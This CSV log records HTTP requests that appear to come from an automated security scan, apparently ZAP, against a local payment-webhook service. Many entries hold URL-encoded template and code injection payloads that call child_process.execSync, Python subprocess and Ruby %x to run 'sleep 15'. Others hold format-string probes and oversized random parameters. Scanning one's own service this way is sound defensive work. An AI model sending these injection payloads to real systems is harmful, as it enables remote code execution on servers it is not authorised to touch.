ID,Requisição de Timestamp,Timestamp de Resposta,Método,URL,Código,Motivo,RTT,Tamanho do Cabeçalho da Resposta,Tamanho do Corpo da Resposta
5116,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=%23%7Bglobal.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%7D,200,OK,8,92,0
5117,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D,200,OK,8,92,0
5118,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=%7B%7Brange.constructor%28%22return+eval%28%5C%22global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29%5C%22%29%22%29%28%29%7D%7D,200,OK,7,92,0
5119,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=%24%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D,200,OK,8,92,0
5120,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=%7B%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D%7D,200,OK,4,92,0
5121,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B157%5D.__repr__.__globals__.get%28%22__builtins__%22%29.get%28%22__import__%22%29%28%22subprocess%22%29.check_output%28%22sleep+15%22%29%7D%7D,200,OK,11,92,0
5122,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:45 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=%3C%25%3D%25x%28sleep+15%29%25%3E,200,OK,8,92,0
5123,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:46 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=%24%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D,200,OK,8,92,0
5124,Sat Jun 22 16:53:45 BRT 2024,Sat Jun 22 16:53:46 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=%23%7B%25x%28sleep+15%29%7D,200,OK,9,92,0
5125,Sat Jun 22 16:53:46 BRT 2024,Sat Jun 22 16:53:46 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=%7B%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D%7D,200,OK,7,92,0
5126,Sat Jun 22 16:53:46 BRT 2024,Sat Jun 22 16:53:46 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=%7Bsystem%28%22sleep+15%22%29%7D,200,OK,9,92,0
5127,Sat Jun 22 16:53:46 BRT 2024,Sat Jun 22 16:53:46 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=%3C%25%3D%25x%28sleep+15%29%25%3E,200,OK,8,92,0
5128,Sat Jun 22 16:53:46 BRT 2024,Sat Jun 22 16:53:46 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=%23%7B%25x%28sleep+15%29%7D,200,OK,6,92,0
5129,Sat Jun 22 16:53:46 BRT 2024,Sat Jun 22 16:53:46 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=%7Bsystem%28%22sleep+15%22%29%7D,200,OK,6,92,0
5130,Sat Jun 22 16:53:46 BRT 2024,Sat Jun 22 16:53:46 BRT 2024,GET,http://localhost:9000,404,Not Found,1,99,0
5131,Sat Jun 22 16:53:46 BRT 2024,Sat Jun 22 16:53:46 BRT 2024,GET,http://localhost:9000/webhook,404,Not Found,1,99,0
5132,Sat Jun 22 16:53:46 BRT 2024,Sat Jun 22 16:53:46 BRT 2024,GET,http://localhost:9000/,404,Not Found,0,99,0
5133,Sat Jun 22 16:53:46 BRT 2024,Sat Jun 22 16:53:46 BRT 2024,GET,http://localhost:9000/webhook/,404,Not Found,1,99,0
5134,Sat Jun 22 16:53:46 BRT 2024,Sat Jun 22 16:53:46 BRT 2024,GET,http://localhost:9000/webhook/processadora,404,Not Found,1,99,0
5135,Sat Jun 22 16:53:46 BRT 2024,Sat Jun 22 16:53:46 BRT 2024,GET,http://localhost:9000/webhook/processadora/,404,Not Found,1,99,0
5136,Sat Jun 22 16:53:46 BRT 2024,Sat Jun 22 16:53:46 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora/,200,OK,3,92,0
5137,Sat Jun 22 16:53:46 BRT 2024,Sat Jun 22 16:53:46 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora/,200,OK,11,92,0
5138,Sat Jun 22 16:53:46 BRT 2024,Sat Jun 22 16:53:46 BRT 2024,GET,http://localhost:9000,404,Not Found,1,99,0
5139,Sat Jun 22 16:53:46 BRT 2024,Sat Jun 22 16:53:46 BRT 2024,GET,http://localhost:9000/webhook,404,Not Found,0,99,0
5140,Sat Jun 22 16:53:46 BRT 2024,Sat Jun 22 16:53:46 BRT 2024,GET,http://localhost:9000/webhook/processadora,404,Not Found,1,99,0
5141,Sat Jun 22 16:53:46 BRT 2024,Sat Jun 22 16:53:46 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=McpXWwsWZwofedETcrAlgTxTcNHlpkyftMBSDeeVgkhjZHIuUNkKoKrFfCksLtyQpUCSuSPNwfDIFbqBGVYrEwofJMEspBDArIdsnXNHRkXqmNHkTqEHfYsyPuyDLdNqaaMFGNuiMNadVBMbVmkydtKuZtVxUJtFVQqHSXbPyhuaJPBqPoxFTHoHlnglumregJUBXKPeafYmhlDKnHkcGIClfxgnoURBAtAjgUBfXLQIICaioLkQjSvJXWQMLNFkLbTLfYhrYSKmVIymYDoeWiolnNXZIPmcBXPKWCwUJbySJdFPTRmRMbUsBpJSXYaNYyltcvRoCUIYwkbBTKDYAvxTDQYaOudxPMWaglUEfijbyAOZKlDtKhuEIPAOophMKlnkIBafIvuvybAKVrBDkBxJNdYemjQMvsZwsupPLYvqCoAZwFDEfnbifdMQfoibVpbQsDLDTLKgqHENgEUGneybdkalAOiYBMhvNMTaCsYkCMQJMKRCfkTSlbowWRjWqCfHpMqyVBXtiylNBkZuvRZaQSpLXvGOewobQxsYYWwPSuEGqPiijpEaCsjHdOiqOHXEEUayKKFcAqpjBjSiEwthPiNpvNeLbJfqwKPPBDlPlbvMkKWIpKKKXMubSkfssggtQChsYOIpEDaoORYdkZUpUhVVMGKTBvCyesIyfyIUZiXKKYnhlHrMZCaEpbMTSRJoZgYLnxjjaGbVdWNedbyXFoHMZepvhVnldjRKNSURDpmqjcsGoiVKIeQJOlxCoJgNrSMAeGEcmNYXBxHsQpOMkEfCnHwYGTZNdFPYSOTRbHLVChSARJTAvuTOsCGSqZHCcbcBWxrHiCyaflUYnWeVWnrLIwmVcwyATNNojCiYPKJUosQYAHJtIKDmoVsxfVGVwuOpWgmdnQTpiPpdudnJvIBbJKfSsYsHmhvIdhdMXpvRWIVqkWpPoZowDJqwEGtHkLhlHBkjdijBUIFbnjuevyfBqnyFJslaekIdqOWnZtBJGmLsxMwtWKHKPPONNZKACMApjHKIUbaTVCSZNhyAjrBVNDqWRttujNJVTBFKJfeSIaiMfCegRWApRBiGvNrRpCFWEYIjrqGdHyPOaZkwtluoTKyDgsQGmpWvEqOoyKskaWLHqomMBFvZDCDihlNLsohpmFeOIgtpiAQfJYOoqppYdqUfVwsYdyVZUwHVOaTIWvgkbLHYJRFAYrxAQmeKUpJonQhDagNyqaitDnOOiIpMrpPOVZRwCaFQIlfUsdnkjljmxyLfvagmTkknlStFClnXViCHDMXEgrOrefWFaZtHLcSgdqnVGFjhIbtoeMIixkHecxovJjfmGteZGkpSakoJZcZsVxQbkLIURZsYSxhSEOTcalDmtfULcndgmxTDdOWCLkcdhHFkPFEPjFoZOtYPZtyWBARawXXfdpJGbvEUaqgoPBPXYNHqwcVADFKswelrPuTtAHFbWXTqBgsuJZJudvfTWBwIdBrlvHoCvmMfxICnlMfTrlUlBMUpJCKpFSZsHBXVsrbvsyklcTrjLXQFJjnZyVLcqoJCieMjVYVdjCBCiiVgkivgvADeCQSnFAhDJmAVujxOELZPSCwuPqGVmxQqgxSpKWQBjIQyyOxZqWaBCsWQFSWfLRoQjySXIOxTIitfkOwGcRhZIvKHyNVwPuJdaZBkPXbvTeaQSFAvhgtxuHAbiXbEaNaBmMrUiDfjanKRTKaGbPwfnWpIiweaHaCGQucJtBdRIsfCZNgWVGrdeYuNWRPrABWxPxMSJKtpTdjQdHuIRNYmYhPElMjouxGeQxuWIEugdZJOtVjBxnVYhRHYQLjlgEOugePYfqitNuojdVbuTDFJqCvRMgiTTbuUuDxcwdtUIVvJDrrxFKLfeFBahDJHOwYokvQGcadwvWWiLepaTEobabWfGRDLfFgmnPCmETisZiJFjRSbkWOWbHNNOUSwpfNaaDZVFtqWBvLRkTfbvLgYNrTWroHHsMAgDQkftEkNKhPddEjMeoojxLXegYiEWjWZrQVGHETeexSnwahNCpvLdovFPMMLIFqMNGPodFAWZqUSwijaCWvwMcLJAitjdGqYwcXXPpiG&status=AguardandoRetornoProcessadora,200,OK,6,92,0
5142,Sat Jun 22 16:53:46 BRT 2024,Sat Jun 22 16:53:46 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=NZLCCsgWoIuGIlqHdMkMXEQaTeGRqAokCAxVjXbWNAIuwwXDPbblDnahtsYMBNVsIUYIuOlipEcuKGyavNZMCJlWWSpYJZSQJuQdpZjMjVdXUencHXLtjKQbYaoeHISliqvbbJVFrZWtAVvOXcsGKrjsRLJRXHMOMGDZVvshijJrMgsOFVeHukHUVrsWRbhCshwIBqqZUOmJOLwqpthEPYaTAjmFKQLDtFBtpmebAHtAxGAWjMLMWsiqkJYJoKLHDKfmxYfeSEcJHYTSCyFNUIlcSLuSEVJJFmcjVgOwQoqjYTkFHZVqwlyYmFWaTlboCQlRBnOFuHnjeZHQLrwRYdFGTAMRpGxGlOUbnfQKrYlrRlfrPVVbWcXLQkKxQcYilTNOHDPgSRJaHZisIogBhIMJaLhiYCrOMwnMfMwDMXYhNDaTwSEEmDxZUmveIoeftDJctFtJNeJHXLjkKscgxDkIOwCHsISeytewqIYtDUaeSZBjjLGeuNhZjNkTZROQavgjqsjLPWqJPTruOPMXZfQKTWeKxgrnojhGVjaDXnaOxLtyPAtDIyBFmCmnFZapXRQoxSHsvwmCCejxdlDSLUehBjbHhvMNyZBlZaLUbuJLlIadXgwZZmgNixhhknLUWFZqPPQaQcZRSGlYEKTmegCrbgMxhDUHSUUshoGAkPjRrTcDotBmhymcjLOxwTCkoNnFqVNpBCYPnyssAwRHVIjsyTtLmHHYHQiZMciBoGxEeLTeHRaKHjCPVwaxknfJEZtplTNFGuTWguRyCOqmvTrcFVcRWATkmGbAchmCgpqSSCJDXwdneciHyCBTFMIWlghDFbqcHMpCdSvaINoNHFWhDfesPWyUqutTEbRxxjiJFfjpotuUJNhCpxCChBmEArYQNcCXdNlZeevaKxVQtDcyLIepNdGKvOmDompKWcogDhYpySWxlMEhMguQDMRLymcjwDwEOiDXHlAancAUwSUMwMWkYPySlEAAtCvtWZpjyXqcPfgbvBDmRXriqidniwhBEcWslrGyIUDrAeXHrSLuqoaobaJnOrbcQfHGmkBxoHnYguupZrIhSPbpqiKmUMDdYqdjUodhoFGEEFQaONGogVsgJQaVwbVUgeJILMXumuBpghrxXeyJnujErZEqJBBxmXEhcqQkNgWQgldOEgtTEuTWCENdjjuBJvwWtnnqkNVviXyOavtSNNpcEUovOTvGCleZJhFjkTyfaVvsEBnYcrKhJRsQIVmNrEIkukmHOuENHJVmpioBpsSFIqxDXPYhMTKZmZJFbxlwvmwioxGtFjNjgJcwGiOiSTEmRimsdtnSXnbFuOXAQEroOTnepMCxGpouPCBeVQyixDnyuibuHxNxrFNBZiyAfBPfWCynLTGdSRvonrsvEclatyZyhJuAvlQfDIckVKCMFwsuUXmKUsiFDALDMuZkudNhxgkinfOsnYnBcfomAGpJvigITamTeovcVidYpTBLkWBjojvjwMwQTGEtoHujKWZDMkbSBRNYbpcQgJxcJhorldCKuZiKhRqGVkHwkSVNGhghwevpNDawjSdbOjELclRuHUibPoojsHAWKgnOdSZrnTJbZsmdKHNcgMPxYXrMbYnVHIZWLTRqykZRxwEDJcmjXxKhEfpnFIZatmOpBMvRgIKODWqmTWnADcFndQWmfuQqlvXLOXxnHUlWeZXvQpRIdqidysYHjRcNSkaZdCilNNbjvsmlZLqGIEAvuUYlgJlpygMUbPoKYWfVCFuFxmcSMeiiXcIHaVcROmkOaVICGQUJCaqfkmPuYwQpHFyjNZuqdOGaiilkwbmaxLLNQePcLwWpGtOnxaJseCHSVrCBgMwJjOeJtDdjFZUcKPvtLFvPLOowdKyUqEPMTgOUbDFIoHGtQwHeoUArBtYfPoacUhTyCkqqqceLocIEUIgnXQBSfDWkfOQAOpJjkZpYrItOSusdwQgBTCJxopPfqXRolyQlOPpawKtCwuWpOQfZhUhrNYWvptfsqocGJgdKZkjqqeHtFUfxIJerITmloNYDEYfgfmGAjHbXAZOWAYNPVBTYgcdWBZEKOHDWgGskhZxLPRirDeQjNdKp&statusReembolso=AguardandoRetornoProcessadora,200,OK,10,92,0
5143,Sat Jun 22 16:53:46 BRT 2024,Sat Jun 22 16:53:46 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=lwQQpSkWqURniUTwEybswSvrPpjvWLlnkrqIVpKcYKxKJelVnEtmtWbYwXYAWaCeDkewpNEndTKmEHhNZxmtXYkpmauwyylRckvBuYuAbgjkJgQpXEleKVoxaEujYEiflrNTQWfUSxrEfolEUjpGAsXSqeJMgkDYTypqVNafPyUtkHwERkGeHPuiZBsYuGpjgOGBkHDmoUINUuVfMWAusYYptImNiveDeFeaJRIPCniCVvmkESWeRnobsLTTDQwaHkGybBriwsPoQpLHCZplIrwuhMEBWGVfOhCnPBOCrLnWqnxBtirFWcAmtMEmOtGMygGTpEHbOnBHpFmriFYnLShmdaSswTBJJxOosmdorMyTThbmTCjFavhCCsNMekDrwSuFEmWcwrAcYeoePkYwtSTDsRFQQirrkhauDutyspPlpoDELDWBxOOnmDrdbbVRyZrVXPHrTdXdCEQcdEWGZJgqHpadFUpOkFvGJIlFInRXLGIbuhiDRTEihcLRAgOTNoJwxgSldfFZGBqxlfXcdNtgVUKOCTetJKSSQVInYrXnKcTOdjKPWFBoZOpNrfHlJFIIqoLoSBDKCdqUFGZwyyeIOwPRPPFbYSZpnynfmxQiqBAFbXUFiURUuLmcPBUdTqZhSaDWVGYfAWfVHsqQKoeunEfmMkeHQSFHWCuoUSsGNeNDZFhyVvxBsZtPdJonIoCRVTaAHfkiRMnuWFQjDnlcppxelVmpLOMQXnppjYBHLytWZtlvYGZNilPNVpHNfGemFRRiDjQaAndtWSiYxKSYmgsfeKglQAOnQsecYOmkKYnhRJRlWqvxPkvrmIRDHviNacKxZvYShHtTLYPuaOjgZlPRpoTlmiALmdlXHtqKgpFuyhPLTpbZGRYWERrgGlEoZSnxUnQXodZKvQxqcHnVwjjNmnTwgLDiGOoCsqBNiElBQYCttBeqOMvplwHcdCUmFwuxnSnDBipIRnJfmIKLMiULrrKLAPLwrvEqxfhQGDrCuqPFlNSTWjGlvudxZpGNHkBNQiVqjUdqUxIZNXXkVhsKqwLlhGMJZhCKwJjjckxgfWfFxbhrHKWklSJNgtSFtCugiNyNyuRcvurHKBIhMuXvXldnMXjnJQTGkMVfDJxcUPrNceJKdlUqVGHIToIifVdmtREwOXWjPAxXUGhvbtRsGKIheXGMMomlpjNSslwoNOMFYkODXNHTUOfPbiUvfKqnymCuLbcjDqTWdLJkrrRovUhlqAUZgLRcdEAEYfptjhDbRWHSvGFDypLfYsIiNYxlhhUoeygtToQBcJShTvbpMQLjqSJGJxADtRrnekBwPFtkfYibPXJEErYftDrZSNUbHfTLyHfNgeyhhfsCJlhURorggEZlEsCdNhQYthMROohZwgnywKJUGpPlvVyuAfpwZqjZgZYVIyimaqrsWUpgfHcfxrBqJgXEYRGUhqiwwkUeQkrAlJjmLrCuMIHZXiRXwnboCmtGgZwPegJaDvuyhbwVhSqxSSxeRMLBvIcdkiMxXiatXjmCLWdITFMhCDSZQKmuUXlxaxJxMoTEYAqsEhpBIfOZZkITYSZUjZEHJfHgPbEJwuKdbULDhninhkqqmGxekcAaOYKxbJskuOFKkRdCMuhoqmwNWgTZBqxnUViEybHaSBPLDFQTwlAZLkZETLYHZkVaIpOYxqHJnNvsAmrbEiGjEcRraIsjRvrphDrtuKIpGAHdNMMbkJCqIcucVVhWLCesSJhQNSnZcQLpjBXRjYkuMjJtDDSltVGpMgPnaAkYNwrPqLtjAbuxPrPTUmgcNAUFFMDYcYLLnJZhDlkqMWoqxiDwYBoSDASLjtNEcCXpfWVfRIGEcwYUEKZQiDHsTKSubRcGCHEVNMvDIqCJhVJIgRAVZSIwjSGFCdAfhIjSpSArhRAtDlQxqYimJhxlmlCTRBLdIlJITwfyqLKdfqZaMtewEWhHvEQInnedkoWUuFFGSRtaDXImQeEDMDnoPcDONcsBYPLvOKLdaUWuGJFIiDTespgEhIRYATvKrWvrYWcCNBZArofqIXKFyxOrjdPUfPJroCpscWFDhtjLDEapMfudYEjnuLRQVAco,200,OK,8,92,0
5144,Sat Jun 22 16:53:46 BRT 2024,Sat Jun 22 16:53:46 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=bqFQUicydllTpZdkdxUKZkLJGIgbiEJnfyvCwiRImXRAorZVgEtbLxEndOLWhcbbuULabrecWLGGahotXbEGJOhpgGKaLPIsbjNYnlZjvxrCJYynHMeoVWyfrgDNePMEKfxRWuueCcMFWNPfaAUhcfjTUNCvkrxdxvTkJFAyULQwaSpffwARKFYrwaVchIEVHKkJChrgevAsoQjhOVdpnaNsDBZwgvcqrFDjOnFsRAJWXYbYCaImTIMEspfUfCanYCNAyXFFefWbZAbDpNCgfOfMlOLpVRaKwrFYRIfGkpSRlctESPUEwMdnQLrZJjHuwlqXHaUmPCOwvywoLFTgshRRBxCnwELuuFqepbnfJQqPidAkFuvGnZMOKGhjIjmEvfYLbGMfgnMNOnYiDDKqniZpgrPFTBVQBWubeUbFFuiRHJCLQdIHBhtlNOfLwANXpsqDKGmLVuYtStENlVSxhiHfHjctpRIXAyXJkQGqVtCynoRIliSLcBOcUlZTHjOePXwdZVeRrWPEAHTTeugucXmUeKOMTtuAEoonOSyWqxncFFKonUOGcCPMlsnQIaHlRDynysYsgbXZIWunJBVlsIFYXIvDrnXUadfaZlcqoCWgoKUSIWFHGYoChUkgVQqeVxOsKcDphjhvNTbsDbJGJZcabdZtedMJrIrniPnDWUwgGDscHRlqXwVRMenSAEDyKlxxkSQnALilfCHPNDHLwPdVtAPelukICQQoUCBsaVMJWjkkprIgWAiymYvPZFFdSHWFZNIVUnfdBdNgJsMSHwLyPKpGjsMmyXAMDXsRCXTHyMPYFhGhhndLcPatswqWCXsVKRNLqAhZKmwnXaFoGDIrubkXpNqftrKFXsAMQHUhroCddITJAskeGwokwlHNwTSCJVpFlyjqpdwUreiSEnpZUVleTkrryXVNohtoZMOXDYTOuWwMMEqSsAdcKgIZVbRMeWWydikudjsqVVVfYCkaJNfHuuHKXHudbmiVdfEeRLBplPDwgyxQZbhVJAatRCQYsmTFbRZTBwgEdpIGthlNMcEpLUDvhxnSSYpLbPgfVEiRhrYIxEFOScDfFETWWpGsOOZgqDiDnZXIFYWFcKAmATSCWdmMgkIMhErNtCEJIHTeDRjqaiDCJWhNqHjmjZvIvmWdZYXnqZiaIYuKIdMjaGVMMgCdBpWuHeEbCUabsidLXZkUfIbpiNqYvUICgrgqfsQEALkkSLddNdJcIacQVaNwOxmaWfsCyOxmNPOlRGuRKCxnxoeQfHoXMfCXetJOAgewxnNUgUfRUfUEclGQZuShDHxDyghwYmdbFZfwlVdctqVmblZVeFBkyAREboURBGbMwfdiVgZWZPrBCiArqAQZjbSRbiLGXVBCYFulTLEeVKyTRObekNtmrNTRZMApFadhHkXkoAsNsXFMFgrJcaPwsKSEMfXBiAOMWEAORFpgItJcfCmKGMLSWFnIDXiAiKfGjiKLnEuAASpNjZtYvGkXyunYsofSsXfOEpTyQxnwZSdMZEmFWelbYTSEkcNDFdxMjaYYyqDfAKGDZKSYnXmTBVZKuJgNWvAfsudblPKqAFLEpZWDGSNTSwXorXXZJSgqdYePZcnkCTeLUKvZyjjSHLrxFyjOpMDIYEOWddNPMROjjjVAQmcJSeXOiVOuYjNcarMaeymWPIWEWvymecXXxOWXUTYgokVohaJESwjRsSIQMnyKSLpBvGXCtUpygewoPiMPDPZaEojnlfUWkqCsVQBkhqNhCECkDJHLyBWoTtHXLuWhhHuGPasmKmqiKWHiyTKpWNkPdkiWWHselhPktsFdFrvWUMmgqZfrJYBEuKnoPghcjGBICoyBfSOTgVwEILYUaseqYIKQyPLfrZPFlgSkfayDaJIelkTGlyrLGegJHqQwomwUcXZiBDNNcdkfUqYDlFojiWRwfvcJEboLQocFCXNYaMsMAIKQqRxnoOMPiZyDuRfcjNkfjyUaIMtgZljScbqLsFeBnMrRIOvgmeZOLFmKZdhxMoxuVcABAWdQfwCOoayTyNQLovZJGplsrsvLXySfjCLkDARPpvlDYkGcKqZEnpHsGquxHqwGExcg,200,OK,7,92,0
5145,Sat Jun 22 16:53:46 BRT 2024,Sat Jun 22 16:53:46 BRT 2024,GET,http://localhost:9000,404,Not Found,0,99,0
5146,Sat Jun 22 16:53:46 BRT 2024,Sat Jun 22 16:53:46 BRT 2024,GET,http://localhost:9000/webhook,404,Not Found,0,99,0
5147,Sat Jun 22 16:53:46 BRT 2024,Sat Jun 22 16:53:46 BRT 2024,GET,http://localhost:9000/webhook/processadora,404,Not Found,1,99,0
5148,Sat Jun 22 16:53:46 BRT 2024,Sat Jun 22 16:53:46 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=ZAP&statusReembolso=AguardandoRetornoProcessadora,200,OK,4,92,0
5149,Sat Jun 22 16:53:46 BRT 2024,Sat Jun 22 16:53:46 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=ZAP&status=AguardandoRetornoProcessadora,200,OK,8,92,0
5150,Sat Jun 22 16:53:46 BRT 2024,Sat Jun 22 16:53:46 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A&statusReembolso=AguardandoRetornoProcessadora,200,OK,8,92,0
5151,Sat Jun 22 16:53:46 BRT 2024,Sat Jun 22 16:53:46 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A&status=AguardandoRetornoProcessadora,200,OK,9,92,0
5152,Sat Jun 22 16:53:46 BRT 2024,Sat Jun 22 16:53:46 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=ZAP+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A&statusReembolso=AguardandoRetornoProcessadora,200,OK,11,92,0
5153,Sat Jun 22 16:53:46 BRT 2024,Sat Jun 22 16:53:46 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=ZAP+%251%21s%252%21s%253%21s%254%21s%255%21s%256%21s%257%21s%258%21s%259%21s%2510%21s%2511%21s%2512%21s%2513%21s%2514%21s%2515%21s%2516%21s%2517%21s%2518%21s%2519%21s%2520%21s%2521%21n%2522%21n%2523%21n%2524%21n%2525%21n%2526%21n%2527%21n%2528%21n%2529%21n%2530%21n%2531%21n%2532%21n%2533%21n%2534%21n%2535%21n%2536%21n%2537%21n%2538%21n%2539%21n%2540%21n%0A&status=AguardandoRetornoProcessadora,200,OK,7,92,0
5154,Sat Jun 22 16:53:46 BRT 2024,Sat Jun 22 16:53:46 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=ZAP,200,OK,8,92,0
5155,Sat Jun 22 16:53:46 BRT 2024,Sat Jun 22 16:53:46 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=ZAP,200,OK,8,92,0
5156,Sat Jun 22 16:53:46 BRT 2024,Sat Jun 22 16:53:46 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-reembolso-processadora?idPedido=idPedido&statusReembolso=ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A,200,OK,9,92,0
5157,Sat Jun 22 16:53:46 BRT 2024,Sat Jun 22 16:53:46 BRT 2024,POST,http://localhost:9000/webhook/processadora/retorno-processadora?idPedido=idPedido&status=ZAP%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%25n%25s%0A,200,OK,7,92,0
